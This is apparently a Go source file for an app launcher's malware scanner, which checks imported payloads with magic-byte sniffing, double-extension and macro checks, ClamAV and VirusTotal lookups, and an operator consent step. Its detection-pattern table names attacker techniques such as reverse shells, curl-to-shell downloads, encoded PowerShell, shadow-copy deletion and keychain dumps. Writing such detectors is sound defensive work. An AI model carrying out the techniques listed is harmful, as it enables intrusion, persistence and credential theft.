// Security scan — malware heuristics + optional signature engines around
// every import. Nothing here executes scanned content: analysis is read-only
// (magic sniffing, bounded text scans, zip entry inspection) plus two opt-in
// engines, ClamAV (local, auto-detected) and VirusTotal (hash-only lookups
// when the operator saved an API key).
//
// Flow: importBytes runs scanPayload BEFORE anything lands. Clean/warnings
// continue (warnings render amber in the import dock); a critical verdict —
// ClamAV detection, VirusTotal ≥2 engines, an EICAR match, or an executable
// disguised as a document — stages the payload in memory and pauses the job;
// the dock shows the findings with Install anyway / Cancel
// (POST /api/security/confirm). After an install lands, importDoneNote runs
// scanAppTree over the installed folder, records the verdict in
// security/verdicts.json (surfaced as the card's ⚠ badge), and appends the
// decision to logs/security.log.
package main

import (
	"archive/zip"
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"time"
)

// ---------------------------------------------------------------------------
// findings

type scanFinding struct {
	Severity string `json:"severity"` // "warn" | "critical"
	Source   string `json:"source"`   // "heuristic" | "eicar" | "clamav" | "virustotal"
	Detail   string `json:"detail"`
	File     string `json:"file,omitempty"`
}

func hasCritical(findings []scanFinding) bool {
	for _, f := range findings {
		if f.Severity == "critical" {
			return true
		}
	}
	return false
}

func secFindingText(f scanFinding) string {
	file := ""
	if f.File != "" {
		file = " [" + f.File + "]"
	}
	return fmt.Sprintf("(%s) %s%s", f.Severity, f.Detail, file)
}

// ---------------------------------------------------------------------------
// constants + pattern table

// eicarString is the industry-standard antivirus test payload. It is inert —
// a 68-byte ASCII string every AV product agrees to detect — and it lets the
// whole pipeline be proven without any engine installed.
const eicarString = `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`

// scanContentLimit bounds the text-pattern read per file (the magic sniff
// reads only the first 512 bytes of any file, whatever its size).
const scanContentLimit = 256 << 10

// scanTree caps keep a deck scan bounded on apps that carry big data trees.
const (
	scanTreeMaxFiles = 5000
	scanTreeMaxRead  = 64 << 20 // total bytes pattern-scanned per scan
)

type secPattern struct {
	name string
	re   *regexp.Regexp
	why  string
}

// secPatterns are the script markers worth naming. Deliberately warn-level:
// real tooling is full of installers and package managers, so patterns never
// block an import by themselves — they surface in the dock and the 🛡 dialog.
var secPatterns = []secPattern{
	{"curl-to-shell", regexp.MustCompile(`(?i)\b(curl|wget)\b[^|\n]{0,200}\|\s*(sudo\s+)?(ba|z|da|k)?sh\b`),
		"downloads code and pipes it straight into a shell"},
	{"powershell-encoded", regexp.MustCompile(`(?i)powershell(\.exe)?\s+[^\n]{0,120}-(enc|encodedcommand)\b`),
		"runs an encoded (obfuscated) PowerShell command"},
	{"powershell-hidden", regexp.MustCompile(`(?i)powershell(\.exe)?\s+[^\n]{0,120}-w\s+(h|hidden)\b`),
		"runs PowerShell with the window hidden"},
	{"invoke-expression", regexp.MustCompile(`(?i)\b(iex|invoke-expression)\b`),
		"executes a string as PowerShell code (classic dropper step)"},
	{"base64-to-shell", regexp.MustCompile(`(?i)base64\s+(-d|--decode)\b[^|\n]{0,120}\|\s*(ba)?sh\b`),
		"decodes a hidden payload and pipes it into a shell"},
	{"python-exec", regexp.MustCompile("(?i)python3?\\s+-c\\s+['\"`]*(exec\\(|import\\s+os;)"),
		"runs obfuscated Python via -c exec"},
	{"osascript-shell", regexp.MustCompile("(?i)osascript\\s+-e\\s+['\"`]*do shell script"),
		"runs a shell command through macOS osascript"},
	{"certutil-download", regexp.MustCompile(`(?i)certutil\s+(-urlcache|-decode|-verifyctl)`),
		"uses certutil as a downloader/decoder (LOLBAS technique)"},
	{"bitsadmin", regexp.MustCompile(`(?i)bitsadmin\s+/transfer`),
		"downloads with bitsadmin (LOLBAS technique)"},
	{"registry-run-key", regexp.MustCompile(`(?i)reg\s+add\s+[^\n]{0,100}\\Run\b`),
		"writes a persistence Run-key into the registry"},
	{"launchctl", regexp.MustCompile(`(?i)launchctl\s+(load|submit)\b`),
		"installs a macOS LaunchAgent/daemon"},
	{"crontab", regexp.MustCompile(`(?i)\bcrontab\b\s*(<|-l|-r|-e|\()`), ""},
	{"scheduled-task", regexp.MustCompile(`(?i)schtasks\s+/create`),
		"creates a Windows scheduled task (persistence)"},
	{"shadow-delete", regexp.MustCompile(`(?i)vssadmin\s+delete\s+shadows`),
		"deletes volume shadow copies (ransomware behavior)"},
	{"hidden-file-attr", regexp.MustCompile(`(?i)attrib\s+\+s\s+\+h`),
		"hides files with the system+hidden attributes"},
	{"reverse-shell", regexp.MustCompile(`(?i)\bnc(\.exe)?\s+-e\b|/dev/tcp/[0-9]`),
		"opens a raw reverse-shell channel"},
	{"keychain-dump", regexp.MustCompile(`(?i)security\s+dump-keychain`),
		"dumps the macOS keychain"},
}

// secDocExts are the extensions a payload should NOT need executable code
// behind — a file wearing one while carrying executable magic is the classic
// disguised-binary shape.
var secDocExts = map[string]bool{
	".pdf": true, ".doc": true, ".docx": true, ".xls": true, ".xlsx": true,
	".ppt": true, ".pptx": true, ".jpg": true, ".jpeg": true, ".png": true,
	".gif": true, ".svg": true, ".txt": true, ".csv": true, ".mp3": true,
	".mp4": true, ".wav": true, ".json": true, ".yaml": true, ".xml": true,
	".html": true, ".md": true,
}

// secDoubleExtRe catches invoice.pdf.exe / photo.jpg.scr shapes: a document
// or media extension followed by an executable one.
var secDoubleExtRe = regexp.MustCompile(`(?i)\.(pdf|docx?|xlsx?|pptx?|jpe?g|png|gif|svg|txt|csv|mp3|mp4|wav)\.(exe|scr|bat|cmd|com|pif|vbs|js|jse|wsf|hta|jar|ps1|msi)$`)

// secMagicOf returns the executable family the bytes claim to be, by magic.
func secMagicOf(b []byte) string {
	switch {
	case len(b) >= 2 && b[0] == 'M' && b[1] == 'Z':
		return "PE/Windows executable"
	case len(b) >= 4 && b[0] == 0x7f && b[1] == 'E' && b[2] == 'L' && b[3] == 'F':
		return "ELF/Linux executable"
	case len(b) >= 2 && b[0] == '#' && b[1] == '!':
		return "script (shebang)"
	case len(b) >= 4:
		switch string(b[:4]) {
		case "\xcf\xfa\xed\xfe", "\xca\xfe\xba\xbe", "\xfe\xed\xfa\xcf", "\xce\xfa\xed\xfe":
			return "Mach-O/macOS executable"
		}
	}
	return ""
}

// secIsTextish reports whether the bytes look like text worth pattern
// scanning (no NULs in the sample).
func secIsTextish(b []byte) bool {
	n := 8192
	if len(b) < n {
		n = len(b)
	}
	return !bytes.ContainsRune(b[:n], 0)
}

// secContentFindings runs the content-only checks (EICAR everywhere, script
// patterns on text) — no name/magic logic. Shared by the payload scanner and
// the tree scanner so both read identically.
func secContentFindings(base string, data []byte) []scanFinding {
	var out []scanFinding
	if bytes.Contains(data, []byte(eicarString)) {
		out = append(out, scanFinding{Severity: "critical", Source: "eicar",
			Detail: "EICAR antivirus test payload detected (the standard test file — harmless, but it proves detection works)", File: base})
	}
	if secIsTextish(data) {
		sample := data
		if len(sample) > scanContentLimit {
			sample = sample[:scanContentLimit]
		}
		text := string(sample)
		for _, p := range secPatterns {
			if p.re.MatchString(text) {
				why := p.why
				if why == "" {
					why = "touches the cron/user task store"
				}
				out = append(out, scanFinding{Severity: "warn", Source: "heuristic",
					Detail: fmt.Sprintf("%s — %s", p.name, why), File: base})
			}
		}
	}
	return out
}

// secNameFindings runs the name- and magic-level checks for one file.
func secNameFindings(base string, magic string) (out []scanFinding) {
	ext := strings.ToLower(filepath.Ext(base))
	if magic != "" && secDocExts[ext] {
		out = append(out, scanFinding{Severity: "critical", Source: "heuristic",
			Detail: fmt.Sprintf("a %s is hiding inside a file named like a %s — the classic disguised-executable shape",
				magic, strings.TrimPrefix(ext, ".")), File: base})
	}
	if secDoubleExtRe.MatchString(base) {
		if magic != "" {
			out = append(out, scanFinding{Severity: "critical", Source: "heuristic",
				Detail: "a real executable carries a double extension (document extension hiding an executable one)", File: base})
		} else {
			out = append(out, scanFinding{Severity: "warn", Source: "heuristic",
				Detail: "double extension — a document extension hides an executable one", File: base})
		}
	}
	return out
}

// secVbaFinding inspects an Office-open-XML payload for macro storage.
func secVbaFinding(base string, data []byte) (out []scanFinding) {
	ext := strings.ToLower(filepath.Ext(base))
	switch ext {
	case ".docx", ".xlsx", ".pptx", ".docm", ".xlsm", ".pptm":
	default:
		return nil
	}
	if len(data) < 4 || string(data[:2]) != "PK" {
		return nil
	}
	if zr, err := zip.NewReader(bytes.NewReader(data), int64(len(data))); err == nil {
		for _, f := range zr.File {
			if strings.HasSuffix(strings.ToLower(f.Name), "vbaproject.bin") {
				return []scanFinding{{Severity: "warn", Source: "heuristic",
					Detail: "Office document contains VBA macros (vbaProject.bin) — macros are a common dropper", File: base}}
			}
		}
	}
	return nil
}

// heuristicFindingsFor is the pure, engine-free core for ONE payload:
// content checks + name/magic checks. Deterministic and offline, so both the
// live scanner and the self-test battery run exactly this code.
func heuristicFindingsFor(name string, body []byte) []scanFinding {
	base := filepath.Base(name)
	out := secContentFindings(base, body)
	out = append(out, secNameFindings(base, secMagicOf(body))...)
	out = append(out, secVbaFinding(base, body)...)
	return out
}

// ---------------------------------------------------------------------------
// ClamAV engine (auto-detected, optional)

var clamavProbe struct {
	once    sync.Once
	path    string // "" = not installed
	version string
	dbDate  string
}

// clamavLookFor probes clamdscan then clamscan once per process. Version
// output looks like "ClamAV 1.4.2/27002/Sat Feb … 2025".
func clamavLookFor() (path, version, dbDate string) {
	clamavProbe.once.Do(func() {
		for _, name := range []string{"clamdscan", "clamscan"} {
			p, err := exec.LookPath(name)
			if err != nil {
				continue
			}
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			out, verr := exec.CommandContext(ctx, p, "--version").CombinedOutput()
			cancel()
			if verr != nil && len(out) == 0 {
				continue
			}
			line := strings.TrimSpace(strings.SplitN(string(out), "\n", 2)[0])
			ver, db := line, ""
			if f := strings.Fields(line); len(f) >= 3 {
				ver, db = f[0], strings.Join(f[2:], " ")
			}
			clamavProbe.path, clamavProbe.version, clamavProbe.dbDate = p, ver, db
			return
		}
	})
	return clamavProbe.path, clamavProbe.version, clamavProbe.dbDate
}

// parseClamavLine extracts the detection name from one clamscan output line
// ("/tmp/x: Eicar-Test-Signature FOUND"). Pure — the self-test drives it.
func parseClamavLine(line string) (detection string, ok bool) {
	i := strings.LastIndex(line, " FOUND")
	if i < 0 {
		return "", false
	}
	rest := strings.TrimSpace(line[:i])
	if j := strings.LastIndex(rest, ": "); j >= 0 {
		rest = strings.TrimSpace(rest[j+2:])
	}
	if rest == "" {
		return "", false
	}
	return rest, true
}

func clamScanFindings(path string) []scanFinding {
	p, _, _ := clamavLookFor()
	if p == "" {
		return nil
	}
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	out, err := exec.CommandContext(ctx, p, "--no-summary", path).CombinedOutput()
	if err != nil && !strings.Contains(string(out), " FOUND") {
		// Exit 2 = engine trouble; degrade to a warning, never block.
		return []scanFinding{{Severity: "warn", Source: "clamav",
			Detail: fmt.Sprintf("ClamAV scan failed (%v) — treated as not-scanned", err)}}
	}
	var findings []scanFinding
	for _, line := range strings.Split(string(out), "\n") {
		if det, ok := parseClamavLine(line); ok {
			findings = append(findings, scanFinding{Severity: "critical", Source: "clamav",
				Detail: "ClamAV detection: " + det, File: filepath.Base(path)})
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// VirusTotal engine (opt-in: operator saves an API key)

var vtRate struct {
	mu  sync.Mutex
	ats []time.Time // last lookup times — the free tier allows 4/min
}

func vtAllow() bool {
	vtRate.mu.Lock()
	defer vtRate.mu.Unlock()
	now := time.Now()
	var kept []time.Time
	for _, t := range vtRate.ats {
		if now.Sub(t) < time.Minute {
			kept = append(kept, t)
		}
	}
	if len(kept) >= 4 {
		vtRate.ats = kept
		return false
	}
	vtRate.ats = append(kept, now)
	return true
}

// parseVTStats pulls last_analysis_stats out of a VT file-report body.
// Pure — the self-test drives it.
func parseVTStats(body []byte) (malicious, suspicious int, known bool, err error) {
	var doc struct {
		Data struct {
			Attributes struct {
				LastAnalysisStats struct {
					Malicious  int `json:"malicious"`
					Suspicious int `json:"suspicious"`
				} `json:"last_analysis_stats"`
			} `json:"attributes"`
		} `json:"data"`
		Error []struct {
			Code string `json:"code"`
		} `json:"error"`
	}
	if err := json.Unmarshal(body, &doc); err != nil {
		return 0, 0, false, err
	}
	for _, e := range doc.Error {
		if e.Code == "NotFoundError" {
			return 0, 0, false, nil
		}
	}
	st := doc.Data.Attributes.LastAnalysisStats
	return st.Malicious, st.Suspicious, true, nil
}

func vtLookup(s *Server, sha string) []scanFinding {
	key := strings.TrimSpace(s.loadLauncherSettings().VirusTotalKey)
	if key == "" {
		return nil
	}
	if !vtAllow() {
		return []scanFinding{{Severity: "warn", Source: "virustotal",
			Detail: "VirusTotal rate limit reached — lookup skipped this time"}}
	}
	client := &http.Client{Timeout: 10 * time.Second}
	req, err := http.NewRequest(http.MethodGet, "https://www.virustotal.com/api/v3/files/"+sha, nil)
	if err != nil {
		return nil
	}
	req.Header.Set("x-apikey", key)
	resp, err := client.Do(req)
	if err != nil {
		return []scanFinding{{Severity: "warn", Source: "virustotal",
			Detail: fmt.Sprintf("VirusTotal lookup failed (%v) — treated as not-scanned", err)}}
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	mal, susp, known, err := parseVTStats(body)
	if err != nil || !known {
		return nil // unknown hash: nothing to say
	}
	flags := mal + susp
	switch {
	case mal >= 2:
		return []scanFinding{{Severity: "critical", Source: "virustotal",
			Detail: fmt.Sprintf("VirusTotal: %d engines flag this payload (%d malicious, %d suspicious)", flags, mal, susp)}}
	case flags > 0:
		return []scanFinding{{Severity: "warn", Source: "virustotal",
			Detail: fmt.Sprintf("VirusTotal: %d engine(s) flag this payload", flags)}}
	}
	return nil
}

// ---------------------------------------------------------------------------
// payload scan (pre-land) + tree scan (post-land)

// scanPayload runs every engine over an import's bytes BEFORE it lands.
// sha is returned so the consent flow and the verdict store can remember it.
func (s *Server) scanPayload(job *jobLog, body []byte, name string) (findings []scanFinding, sha string) {
	sum := sha256.Sum256(body)
	sha = hex.EncodeToString(sum[:])
	findings = heuristicFindingsFor(name, body)

	dataDir := s.securityDataDir()
	if securityOverrideKnown(dataDir, sha) {
		job.logf("security: payload hash was explicitly allowed before — findings stay, but no prompt")
		for i := range findings {
			if findings[i].Severity == "critical" {
				findings[i].Detail += " (previously allowed by you)"
				findings[i].Severity = "warn"
			}
		}
	}

	// Engines, both best-effort with hard timeouts.
	if p, ver, _ := clamavLookFor(); p != "" {
		job.logf("security: ClamAV %s scanning…", ver)
		tmp, err := os.CreateTemp("", "appdeck-scan-*")
		if err == nil {
			_, werr := tmp.Write(body)
			tmp.Close()
			if werr == nil {
				findings = append(findings, clamScanFindings(tmp.Name())...)
			} else {
				job.logf("security: ClamAV skipped (%v)", werr)
			}
			os.Remove(tmp.Name())
		}
	}
	findings = append(findings, vtLookup(s, sha)...)

	for _, f := range findings {
		job.logf("WARNING: security — %s", secFindingText(f))
	}
	if !hasCritical(findings) {
		job.logf("security scan: %d finding(s), nothing critical", len(findings))
	}
	return findings, sha
}

// appSecVerdict is one installed app's last scan state, persisted in
// security/verdicts.json and surfaced as the card's ⚠ badge.
type appSecVerdict struct {
	Level    string        `json:"level"` // "clean" | "warn" | "flagged"
	Findings []scanFinding `json:"findings,omitempty"`
	Hash     string        `json:"hash,omitempty"`
	At       time.Time     `json:"at"`
	Allowed  bool          `json:"allowed,omitempty"` // operator chose Install anyway for these bytes
}

// scanAppTree heuristically walks an installed app folder (bounded). Free
// function so the self-test battery can drive it without a live server.
// Signature trust rides here: a vendor-signed app's heuristic warnings stay
// informational, an invalid seal escalates any warning to flagged.
func scanAppTree(a *App) (findings []scanFinding, level string) {
	files, reads := 0, 0
	stopped := ""
	_ = filepath.WalkDir(a.Dir, func(path string, d os.DirEntry, err error) error {
		if err != nil || stopped != "" {
			if stopped != "" {
				return filepath.SkipAll
			}
			return nil
		}
		if d.IsDir() {
			return nil
		}
		files++
		if files > scanTreeMaxFiles {
			stopped = "file cap reached"
			return filepath.SkipAll
		}
		info, ierr := d.Info()
		if ierr != nil {
			return nil
		}
		rel, _ := filepath.Rel(a.Dir, path)
		base := filepath.Base(path)

		// Magic check is cheap for every file: the first 512 bytes.
		head := make([]byte, 512)
		if f, err := os.Open(path); err == nil {
			n, _ := f.Read(head)
			f.Close()
			head = head[:n]
		}
		magic := secMagicOf(head)
		findings = append(findings, secNameFindings(base, magic)...)

		if strings.EqualFold(base, "autorun.inf") {
			findings = append(findings, scanFinding{Severity: "warn", Source: "heuristic",
				Detail: "autorun.inf — removable-drive auto-execution dropfile", File: rel})
		}

		// Content: EICAR always; patterns only for text-ish files within
		// the per-file and global read budgets.
		if info.Size() > 2<<20 || reads > scanTreeMaxRead {
			return nil
		}
		data, err := os.ReadFile(path)
		if err != nil {
			return nil
		}
		reads += len(data)
		for _, f := range secContentFindings(base, data) {
			f.File = rel
			findings = append(findings, f)
		}
		for _, f := range secVbaFinding(base, data) {
			f.File = rel
			findings = append(findings, f)
		}
		return nil
	})
	if stopped != "" {
		findings = append(findings, scanFinding{Severity: "warn", Source: "heuristic",
			Detail: fmt.Sprintf("scan stopped early: %s (%d files scanned)", stopped, files)})
	}

	level = "clean"
	if hasCritical(findings) {
		level = "flagged"
	} else if len(findings) > 0 {
		level = "warn"
		switch a.Signature {
		case "vendor":
			// A verified vendor seal vouches for the payload; heuristic
			// warnings stay informational.
			level = "clean"
			findings = append(findings, scanFinding{Severity: "warn", Source: "heuristic",
				Detail: fmt.Sprintf("%d heuristic note(s) suppressed — the app carries a verified vendor signature", len(findings))})
		case "invalid":
			level = "flagged"
		}
	}
	return findings, level
}

// ---------------------------------------------------------------------------
// persisted verdicts + overrides

func securityDir(dataDir string) string { return filepath.Join(dataDir, "security") }

func securityVerdictsPath(dataDir string) string {
	return filepath.Join(securityDir(dataDir), "verdicts.json")
}

type securityVerdictStore struct {
	Verdicts map[string]appSecVerdict `json:"verdicts"`
}

func loadSecurityVerdicts(dataDir string) map[string]appSecVerdict {
	out := map[string]appSecVerdict{}
	data, err := os.ReadFile(securityVerdictsPath(dataDir))
	if err == nil {
		var store securityVerdictStore
		if json.Unmarshal(data, &store) == nil && store.Verdicts != nil {
			out = store.Verdicts
		}
	}
	return out
}

func saveSecurityVerdicts(dataDir string, v map[string]appSecVerdict) {
	os.MkdirAll(securityDir(dataDir), 0o755)
	data, err := json.MarshalIndent(securityVerdictStore{Verdicts: v}, "", "  ")
	if err != nil {
		return
	}
	p := securityVerdictsPath(dataDir)
	tmp := p + ".tmp"
	if os.WriteFile(tmp, data, 0o644) == nil {
		_ = os.Rename(tmp, p)
	}
}

// applySecurityVerdicts lifts stored levels onto the freshly loaded apps so
// the card badges survive launcher restarts.
func applySecurityVerdicts(dataDir string, apps []*App) {
	v := loadSecurityVerdicts(dataDir)
	if len(v) == 0 {
		return
	}
	for _, a := range apps {
		if vd, ok := v[a.ID]; ok {
			a.Security = vd.Level
		}
	}
}

func securityOverridesPath(dataDir string) string {
	return filepath.Join(securityDir(dataDir), "overrides.json")
}

type securityOverrideStore struct {
	Overrides map[string]overrideRec `json:"overrides"`
}

type overrideRec struct {
	Name string    `json:"name"`
	At   time.Time `json:"at"`
}

func loadSecurityOverrides(dataDir string) map[string]overrideRec {
	out := map[string]overrideRec{}
	data, err := os.ReadFile(securityOverridesPath(dataDir))
	if err == nil {
		var store securityOverrideStore
		if json.Unmarshal(data, &store) == nil && store.Overrides != nil {
			out = store.Overrides
		}
	}
	return out
}

func saveSecurityOverrides(dataDir string, o map[string]overrideRec) {
	os.MkdirAll(securityDir(dataDir), 0o755)
	data, err := json.MarshalIndent(securityOverrideStore{Overrides: o}, "", "  ")
	if err != nil {
		return
	}
	p := securityOverridesPath(dataDir)
	tmp := p + ".tmp"
	if os.WriteFile(tmp, data, 0o644) == nil {
		_ = os.Rename(tmp, p)
	}
}

// securityOverrideKnown reports whether the operator already allowed these
// bytes (by payload hash). Capped: past 200 the oldest entries fall off.
func securityOverrideKnown(dataDir, sha string) bool {
	_, ok := loadSecurityOverrides(dataDir)[sha]
	return ok
}

func securityOverrideAdd(dataDir, sha, name string) {
	o := loadSecurityOverrides(dataDir)
	o[sha] = overrideRec{Name: name, At: time.Now()}
	for len(o) > 200 {
		oldest, oldestAt := "", time.Time{}
		for k, v := range o {
			if oldest == "" || v.At.Before(oldestAt) {
				oldest, oldestAt = k, v.At
			}
		}
		delete(o, oldest)
	}
	saveSecurityOverrides(dataDir, o)
}

// securityAudit appends one line to logs/security.log (best effort).
// secShortSha truncates a hash for log lines without panicking on short
// test fixtures.
func secShortSha(sha string) string {
	if len(sha) > 12 {
		return sha[:12]
	}
	return sha
}

func (s *Server) securityAudit(format string, args ...any) {
	if s == nil || s.cfg.LogDir == "" {
		return
	}
	os.MkdirAll(s.cfg.LogDir, 0o755)
	f, err := os.OpenFile(filepath.Join(s.cfg.LogDir, "security.log"),
		os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0o644)
	if err != nil {
		return
	}
	defer f.Close()
	fmt.Fprintf(f, "[%s] %s\n", time.Now().Format("2006-01-02 15:04:05"), fmt.Sprintf(format, args...))
}

// securityDataDir is the store root for Server-owned paths (""-safe).
func (s *Server) securityDataDir() string { return s.cfg.DataDir }

// securityScanInstalled runs the post-land tree scan over an app that just
// installed, persists its verdict (the ⚠ badge), and logs the findings.
// Warn-level by design: nothing installed is ever removed here.
func (s *Server) securityScanInstalled(a *App, job *jobLog) {
	if a == nil || a.Dir == "" {
		return
	}
	findings, level := scanAppTree(a)
	v := loadSecurityVerdicts(s.securityDataDir())
	prev := v[a.ID]
	v[a.ID] = appSecVerdict{Level: level, Findings: findings, Hash: prev.Hash, At: time.Now(), Allowed: prev.Allowed}
	saveSecurityVerdicts(s.securityDataDir(), v)
	for _, ap := range s.appsList() {
		if ap.ID == a.ID {
			ap.Security = level
		}
	}
	for _, f := range findings {
		job.logf("WARNING: security — %s", secFindingText(f))
	}
	if level == "clean" {
		job.logf("security scan: clean")
	} else {
		job.logf("security scan: %s — see the 🛡 dialog for details", level)
	}
	s.securityAudit("installed app=%q level=%s findings=%d", a.ID, level, len(findings))
}

// ---------------------------------------------------------------------------
// pending-consent store (pause → Install anyway / Cancel)

const (
	securityPendingMax = 2
	securityPendingTTL = 15 * time.Minute
	securityHeartbeat  = 2 * time.Minute
)

type pendingScan struct {
	ID       string
	JobID    string
	Name     string
	Qs       map[string]string
	Body     []byte
	Findings []scanFinding
	SHA      string
	Expires  time.Time
	stop     chan struct{}
	stopOnce sync.Once
}

var secPending struct {
	mu  sync.Mutex
	m   map[string]*pendingScan // scanID → pending
	seq int
}

func secPendingRemoveLocked(id string) {
	if p, ok := secPending.m[id]; ok {
		p.stopOnce.Do(func() { close(p.stop) })
		delete(secPending.m, id)
	}
}

// securityStagePending holds a critical payload for the operator's decision
// and keeps the job's watchdog fed while it waits.
func (s *Server) securityStagePending(job *jobLog, jobID string, body []byte, name string, qs map[string]string, findings []scanFinding, sha string) string {
	secPending.mu.Lock()
	if secPending.m == nil {
		secPending.m = map[string]*pendingScan{}
	}
	now := time.Now()
	for id, p := range secPending.m {
		if now.After(p.Expires) {
			secPendingRemoveLocked(id)
		}
	}
	for len(secPending.m) >= securityPendingMax {
		oldestID, oldest := "", time.Time{}
		for id, p := range secPending.m {
			if oldest.IsZero() || p.Expires.Before(oldest) {
				oldestID, oldest = id, p.Expires
			}
		}
		if oldestID == "" {
			break
		}
		secPendingRemoveLocked(oldestID)
	}
	secPending.seq++
	id := fmt.Sprintf("sec-%d-%d", time.Now().UnixNano(), secPending.seq)
	p := &pendingScan{
		ID: id, JobID: jobID, Name: name, Qs: qs, Body: body,
		Findings: findings, SHA: sha,
		Expires: now.Add(securityPendingTTL),
		stop:    make(chan struct{}),
	}
	secPending.m[id] = p
	secPending.mu.Unlock()
	s.securityAudit("paused name=%q sha=%s findings=%d — awaiting decision", name, secShortSha(sha), len(findings))
	go func() {
		t := time.NewTicker(securityHeartbeat)
		defer t.Stop()
		for {
			select {
			case <-p.stop:
				return
			case <-t.C:
				secPending.mu.Lock()
				_, alive := secPending.m[id]
				expired := alive && time.Now().After(p.Expires)
				secPending.mu.Unlock()
				if !alive {
					return
				}
				if expired {
					s.securityResolvePending(id, "expired")
					return
				}
				job.logf("security: waiting for your decision — Install anyway or Cancel in the dock (%s remains)",
					time.Until(p.Expires).Round(time.Second))
			}
		}
	}()
	return id
}

func (s *Server) securityPendingForJob(jobID string) (*pendingScan, bool) {
	secPending.mu.Lock()
	defer secPending.mu.Unlock()
	for _, p := range secPending.m {
		if p.JobID == jobID {
			return p, true
		}
	}
	return nil, false
}

// securityResolvePending applies the operator's decision:
//   - "install": mark the job approved, replay importBytes with the stashed
//     bytes under the SAME jobid (the dock is already polling it), remember
//     the payload hash so re-imports of the same bytes don't re-prompt;
//   - "cancel"/"expired": drop the payload and close the job as canceled.
func (s *Server) securityResolvePending(scanID, action string) {
	secPending.mu.Lock()
	p, ok := secPending.m[scanID]
	if ok {
		secPendingRemoveLocked(scanID)
	}
	secPending.mu.Unlock()
	if !ok {
		return
	}
	job := s.job(p.JobID)
	switch action {
	case "install":
		if p.SHA != "" {
			securityOverrideAdd(s.securityDataDir(), p.SHA, p.Name)
		}
		securityJobApprove(p.JobID)
		s.securityAudit("install-anyway name=%q sha=%s findings=%d", p.Name, secShortSha(p.SHA), len(p.Findings))
		go func() {
			job.logf("security: installing anyway — you accepted these findings")
			s.importBytes(secNOPWriter{}, p.Body, p.Qs, job)
			securityJobClear(p.JobID)
		}()
	default:
		s.securityAudit("canceled name=%q sha=%s findings=%d action=%s", p.Name, secShortSha(p.SHA), len(p.Findings), action)
		job.logf("security: payload discarded — nothing was installed")
		job.finish("canceled at the security prompt — the flagged payload was discarded")
	}
}

// securityJobApprove / -check: one jobid's replay skips the gate.
var secApproved struct {
	mu sync.Mutex
	m  map[string]bool
}

func securityJobApprove(jobID string) {
	secApproved.mu.Lock()
	defer secApproved.mu.Unlock()
	if secApproved.m == nil {
		secApproved.m = map[string]bool{}
	}
	secApproved.m[jobID] = true
}

func securityJobApproved(jobID string) bool {
	secApproved.mu.Lock()
	defer secApproved.mu.Unlock()
	return secApproved.m[jobID]
}

func securityJobClear(jobID string) {
	secApproved.mu.Lock()
	defer secApproved.mu.Unlock()
	delete(secApproved.m, jobID)
}

// securityClearPendingForJob drops any pending staged for jobID (stopping
// its heartbeat) — the approved replay supersedes the pause.
func (s *Server) securityClearPendingForJob(jobID string) {
	secPending.mu.Lock()
	defer secPending.mu.Unlock()
	for id, p := range secPending.m {
		if p.JobID == jobID {
			secPendingRemoveLocked(id)
		}
	}
}

// secNOPWriter absorbs importBytes' HTTP responses when the replay runs
// from the confirm handler — the dock follows the job, not this response.
type secNOPWriter struct{}

func (secNOPWriter) Header() http.Header         { return http.Header{} }
func (secNOPWriter) WriteHeader(int)             {}
func (secNOPWriter) Write(b []byte) (int, error) { return len(b), nil }

// ---------------------------------------------------------------------------
// start-gate

// secStartConfirmed remembers per-launcher-run which flagged apps the
// operator explicitly started (the prompt shows once per app per run).
var secStartConfirmed sync.Map

// securityStartOK decides whether Start may proceed for this app.
func securityStartOK(a *App) bool {
	if a.Security != "flagged" {
		return true
	}
	if vd, ok := loadSecurityVerdicts(securityVerdictsDirFor(a))[a.ID]; ok && vd.Allowed {
		return true // the operator already accepted exactly these bytes
	}
	_, done := secStartConfirmed.Load(a.ID)
	return done
}

// securityVerdictsDirFor resolves the data dir for an app context: the
// launcher's own data dir is where the stores live.
func securityVerdictsDirFor(*App) string { return launcherDataDir() }

// launcherDataDir resolves the writable data dir without a Server handle
// (the start-gate and pending paths run before/outside request context).
func launcherDataDir() string {
	if v := strings.TrimSpace(os.Getenv("LAUNCHER_DATA_DIR")); v != "" {
		return v
	}
	return defaultDataDir()
}

// ---------------------------------------------------------------------------
// HTTP handlers

func (s *Server) secVerdictRows() []map[string]any {
	v := loadSecurityVerdicts(s.securityDataDir())
	byID := map[string]*App{}
	for _, a := range s.appsList() {
		byID[a.ID] = a
	}
	out := []map[string]any{}
	for id, vd := range v {
		name := id
		if a := byID[id]; a != nil {
			name = a.Name
		}
		out = append(out, map[string]any{
			"id": id, "name": name, "level": vd.Level, "allowed": vd.Allowed,
			"at": vd.At, "findings": vd.Findings,
		})
	}
	return out
}

// serveSecurityInfo answers GET /api/security: engine status + verdicts.
func (s *Server) serveSecurityInfo(w http.ResponseWriter, r *http.Request) {
	clamPath, clamVer, clamDB := clamavLookFor()
	key := strings.TrimSpace(s.loadLauncherSettings().VirusTotalKey) != ""
	engines := []map[string]any{
		{"id": "heuristics", "name": "Built-in heuristics", "ok": true,
			"detail": "always on — magic checks, pattern analysis, EICAR"},
	}
	if clamPath != "" {
		engines = append(engines, map[string]any{"id": "clamav", "name": "ClamAV", "ok": true,
			"detail": fmt.Sprintf("%s · signatures %s", clamVer, clamDB)})
	} else {
		engines = append(engines, map[string]any{"id": "clamav", "name": "ClamAV", "ok": false,
			"detail": "not installed — add it for signature detection (brew install clamav · clamav.net)"})
	}
	engines = append(engines, map[string]any{"id": "virustotal", "name": "VirusTotal", "ok": key,
		"detail": map[bool]string{true: "API key saved — hash lookups on every import",
			false: "no API key — save one below for hash lookups (virustotal.com, free tier)"}[key]})
	s.writeJSON(w, http.StatusOK, map[string]any{
		"engines":  engines,
		"verdicts": s.secVerdictRows(),
		"platform": runtime.GOOS,
	})
}

// serveSecurityScan answers POST /api/security/scan: heuristically scan one
// app ({id}) or the whole deck ({}), refresh the verdict store.
